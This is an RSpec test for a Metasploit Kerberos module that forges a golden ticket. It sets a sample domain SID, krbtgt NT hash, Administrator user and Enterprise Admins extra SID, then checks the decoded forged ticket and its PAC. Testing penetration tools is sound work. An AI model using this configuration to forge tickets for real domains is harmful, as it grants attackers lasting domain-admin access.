require 'rspec'

RSpec.describe 'kerberos keytab' do
  include_context 'Msf::UIDriver'
  include_context 'Msf::Simple::Framework#modules loading'

  let(:subject) do
    load_and_create_module(
      module_type: 'auxiliary',
      reference_name: 'admin/kerberos/forge_ticket'
    )
  end

  before(:each) do
    Timecop.freeze(Time.parse('Jul 15, 2022 12:33:40.000000000 GMT'))
    subject.datastore['VERBOSE'] = true
    allow(driver).to receive(:input).and_return(driver_input)
    allow(driver).to receive(:output).and_return(driver_output)
    subject.init_ui(driver_input, driver_output)
  end

  after do
    Timecop.return
  end

  describe '#run' do
    context 'when forging golden tickets' do
      it 'generates a golden ticket' do
        subject.datastore['ACTION'] = 'FORGE_GOLDEN'
        subject.datastore['DOMAIN'] = 'demo.local'
        subject.datastore['DOMAIN_SID'] = 'S-1-5-21-1266190811-2419310613-1856291569'
        subject.datastore['NTHASH'] = '767400b2c71afa35a5dca216f2389cd9'
        subject.datastore['USER'] = 'Administrator'
        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab
        subject.datastore['EXTRA_SIDS'] = ' S-1-18-1,  S-1-5-21-1266190811-2419310613-1856291569-519, '
        subject.datastore['SessionKey'] = 'A' * 16

        subject.run

        ticket_save_path = @output.join("\n")[/Cache ticket saved to (.*)$/, 1]
        expect(@output.join("\n")).to match_table <<~TABLE
          TGT MIT Credential Cache ticket saved to #{ticket_save_path}
          Primary Principal: Administrator@DEMO.LOCAL
          Ccache version: 4

          Creds: 1
            Credential[0]:
              Server: krbtgt/DEMO.LOCAL@DEMO.LOCAL
              Client: Administrator@DEMO.LOCAL
              Ticket etype: 23 (RC4_HMAC)
              Key: 41414141414141414141414141414141
              Subkey: false
              Ticket Length: 1014
              Ticket Flags: 0x50e00000 (FORWARDABLE, PROXIABLE, RENEWABLE, INITIAL, PRE_AUTHENT)
              Addresses: 0
              Authdatas: 0
              Times:
                Auth time: #{Time.parse('2022-07-15 13:33:40 +0100').to_time}
                Start time: #{Time.parse('2022-07-15 13:33:40 +0100').to_time}
                End time: #{Time.parse('2032-07-12 13:33:40 +0100').to_time}
                Renew Till: #{Time.parse('2032-07-12 13:33:40 +0100').to_time}
              Ticket:
                Ticket Version Number: 5
                Realm: DEMO.LOCAL
                Server Name: krbtgt/DEMO.LOCAL
                Encrypted Ticket Part:
                  Ticket etype: 23 (RC4_HMAC)
                  Key Version Number: 2
                  Decrypted (with key: 767400b2c71afa35a5dca216f2389cd9):
                    Times:
                      Auth time: #{Time.parse('2022-07-15 12:33:40 UTC').to_time}
                      Start time: #{Time.parse('2022-07-15 12:33:40 UTC').to_time}
                      End time: #{Time.parse('2032-07-12 12:33:40 UTC').to_time}
                      Renew Till: #{Time.parse('2032-07-12 12:33:40 UTC').to_time}
                    Client Addresses: 0
                    Transited: tr_type: 0, Contents: ""
                    Client Name: 'Administrator'
                    Client Realm: 'DEMO.LOCAL'
                    Ticket etype: 23 (RC4_HMAC)
                    Session Key: 41414141414141414141414141414141
                    Flags: 0x50e00000 (FORWARDABLE, PROXIABLE, RENEWABLE, INITIAL, PRE_AUTHENT)
                    PAC:
                      Validation Info:
                        Logon Time: #{Time.parse('2022-07-15 13:33:40 +0100').to_time}
                        Logoff Time: Never Expires (inf)
                        Kick Off Time: Never Expires (inf)
                        Password Last Set: No Time Set (0)
                        Password Can Change: No Time Set (0)
                        Password Must Change: Never Expires (inf)
                        Logon Count: 0
                        Bad Password Count: 0
                        User ID: 500
                        Primary Group ID: 513
                        User Flags: 32
                        User Session Key: 00000000000000000000000000000000
                        User Account Control: 528
                        Sub Auth Status: 0
                        Last Successful Interactive Logon: No Time Set (0)
                        Last Failed Interactive Logon: No Time Set (0)
                        Failed Interactive Logon Count: 0
                        Extra SID Count: 2
                          SID: S-1-18-1, Attributes: 7
                          SID: S-1-5-21-1266190811-2419310613-1856291569-519, Attributes: 7
                        Resource Group Count: 0
                        Group Count: 5
                        Group IDs:
                          Relative ID: 513, Attributes: 7
                          Relative ID: 512, Attributes: 7
                          Relative ID: 520, Attributes: 7
                          Relative ID: 518, Attributes: 7
                          Relative ID: 519, Attributes: 7
                        Logon Domain ID: S-1-5-21-1266190811-2419310613-1856291569
                        Effective Name: 'Administrator'
                        Full Name: ''
                        Logon Script: ''
                        Profile Path: ''
                        Home Directory: ''
                        Home Directory Drive: ''
                        Logon Server: ''
                        Logon Domain Name: 'DEMO.LOCAL'
                      Client Info:
                        Name: 'Administrator'
                        Client ID: #{Time.parse('2022-07-15 13:33:40 +0100').to_time}
                      Pac Server Checksum:
                        Signature: 6dc9bd5369b0defac778b349e298012a
                      Pac Privilege Server Checksum:
                        Signature: 0ac8624ae3cc7cd3750fcf902d006b5f
        TABLE
        expect(ticket_save_path).to_not be_nil
      end
    end
  end
end
